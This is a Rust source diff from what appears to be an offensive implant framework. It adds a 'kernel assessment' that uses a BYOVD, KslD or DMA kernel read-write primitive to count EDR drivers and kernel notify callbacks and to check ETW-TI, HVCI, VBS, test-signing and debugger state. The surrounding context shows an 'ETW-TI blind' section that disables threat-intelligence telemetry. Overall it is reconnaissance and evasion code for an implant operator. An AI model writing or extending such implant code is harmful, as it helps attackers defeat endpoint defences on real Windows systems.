@@ -214,6 +214,92 @@ pub trait KernelRw: Send + Sync {
     }
 }
 
+// ---- §1.5 Kernel assessment (T-REX T4-T5, real) ---------------------------
+
+/// Whether a [`KernelAssessment`] reflects real kernel data.
+///
+/// Honest-status marker: `Assessed` means at least one of the two user-mode
+/// `NtQuerySystemInformation` paths (module enumeration / code integrity)
+/// returned real data. `NotAssessed` means the assessment could not run — the
+/// remaining fields are unset, NEVER evidence of a clean kernel.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum KernelAssessmentStatus {
+    /// Assessment completed against real kernel data.
+    Assessed,
+    /// Assessment could not run — the kernel queries are unavailable here. The
+    /// remaining fields are unset, NOT evidence of a clean kernel.
+    #[default]
+    NotAssessed,
+}
+
+/// Kernel-layer posture report (T-REX T4-T5) — the operator-side replacement
+/// for the implant's user-mode kernel stubs. Produced by [`assess_kernel`]
+/// over a live `KernelRw` (BYOVD / KslD / DMA).
+#[derive(Debug, Clone, Copy, Default)]
+pub struct KernelAssessment {
+    /// Whether the fields below reflect a real assessment. `NotAssessed`
+    /// (default) means the posture is unknown — never interpret zeroed fields
+    /// as a clean kernel.
+    pub status: KernelAssessmentStatus,
+    /// Loaded kernel modules (incl. ntoskrnl), counted from
+    /// `NtQuerySystemInformation(SystemModuleInformation)`.
+    pub total_drivers: u32,
+    /// Loaded modules whose file name matches a known EDR driver name.
+    pub edr_drivers: u32,
+    /// ETW-TI provider (`Microsoft-Windows-Threat-Intelligence`) enabled — an
+    /// EDR is subscribed. Read via the same chase `EtwTiBlind` uses.
+    pub etw_ti_active: bool,
+    /// Non-zero `EX_CALLBACK` slots in `PspCreateProcessNotifyRoutine` (64-slot).
+    pub process_callbacks: u32,
+    /// Non-zero `EX_CALLBACK` slots in `PspLoadImageNotifyRoutine` (64-slot).
+    pub image_load_callbacks: u32,
+    /// Non-zero slots in `CmpCallBackVector`. No verified pattern site exists
+    /// yet — honestly 0 when the window cannot be resolved.
+    pub registry_callbacks: u32,
+    /// `CODEINTEGRITY_OPTION_TESTSIGN` (bit 1 of the System Code Integrity options).
+    pub test_signing_enabled: bool,
+    /// `KUSER_SHARED_DATA.KdDebuggerEnabled` — kernel debugger attached.
+    pub kernel_debugger_present: bool,
+    /// `HVCI_KMCI_ENABLED` (bit 9 of the System Code Integrity options).
+    pub hvci_enabled: bool,
+    /// VBS enabled (approximate — bit 12 of the System Code Integrity options).
+    pub vbs_enabled: bool,
+}
+
+/// Run a real T4-T5 kernel assessment over a live kernel read/write primitive.
+///
+/// On Windows this enumerates kernel modules, reads the System Code Integrity
+/// options, counts the Ps*NotifyRoutine callback arrays (the pattern-scan path
+/// shared with `win::resolve_offsets`), and probes the ETW-TI provider enable
+/// state — the assessment the implant's user-mode T-REX could never produce
+/// (see `crates/implant-win/src/trex/mod.rs` module docs). On non-Windows
+/// hosts there is nothing to measure: the result is honestly `NotAssessed`.
+///
+/// `status` is `Assessed` iff at least one of the two user-mode NtQuery paths
+/// (module enumeration / code integrity) returned real data; a completely
+/// failed assessment is `NotAssessed` — never a fabricated 'clean'.
+///
+/// # Safety
+/// On Windows, reads kernel memory via `krw` (callback arrays + ETW-TI
+/// provider chain) and calls `NtQuerySystemInformation`. Single-threaded
+/// operator context.
+pub unsafe fn assess_kernel(krw: &dyn KernelRw) -> KernelAssessment {
+    #[cfg(target_os = "windows")]
+    {
+        // SAFETY: documented on the function; the Windows impl validates every
+        // read and treats failures as "not measured", never fabricated.
+        unsafe { crate::win::assess::assess_kernel_impl(krw) }
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        let _ = krw;
+        KernelAssessment {
+            status: KernelAssessmentStatus::NotAssessed,
+            ..KernelAssessment::default()
+        }
+    }
+}
+
 // ---- §2 Telemetry neutralization ------------------------------------------
 
 /// §2.1 — ETW-TI blind. Single QWORD write to `ProviderEnableInfo.IsEnabled=0`
